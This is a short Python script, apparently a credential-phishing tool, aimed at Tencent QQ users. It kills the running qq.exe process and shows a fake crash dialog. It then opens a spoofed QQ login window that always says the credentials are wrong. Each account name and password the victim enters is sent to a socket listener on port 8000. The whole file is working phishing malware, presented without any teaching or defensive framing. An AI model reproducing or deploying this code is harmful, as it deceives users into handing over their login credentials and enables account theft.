import socket
import sys
import os
import tkinter
from tkinter import messagebox
os.system('taskkill /f /im qq.exe')
messagebox.showerror(title="提示", message="腾讯QQ发生了故障,请重新登录")
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '127.0.0.1'
port = 8000
serversocket.bind((host, port))
serversocket.listen(500)
from tkinter import *
 
class Reg (Frame):
  def __init__(self,master):
    frame = Frame(master)
    frame.pack()
    self.lab1 = Label(frame,text = "账号:")
    self.lab1.grid(row = 0,column = 0,sticky = W)
    self.ent1 = Entry(frame)
    self.ent1.grid(row = 0,column = 1,sticky = W)
    self.lab2 = Label(frame,text = "密码:")
    self.lab2.grid(row = 1,column = 0)
    self.ent2 = Entry(frame,show = "*")
    self.ent2.grid(row = 1,column = 1,sticky = W)
    self.button = Button(frame,text = "登录",command = self.Submit)
    self.button.grid(row = 2,column = 1,sticky = E)
    self.lab3 = Label(frame,text = "")
    self.lab3.grid(row = 3,column = 0,sticky = W)
    self.button2 = Button(frame,text = "取消",command = frame.quit)
    self.button2.grid(row = 3,column = 3,sticky = E)
  def Submit(self):
    s1 = self.ent1.get()
    s2 = self.ent2.get()
    self.lab3["text"] = "用户名或密码错误!"
    self.ent1.delete(0,len(s1))
    self.ent2.delete(0,len(s2))
    clientsocket,addr = serversocket.accept()      
    msg=f'账号{s1} 密码{s2}'
    clientsocket.send(msg.encode('utf-8'))
    clientsocket.close()
root = Tk()
root.title("腾讯qq异常处理")
app = Reg(root)
root.mainloop()     



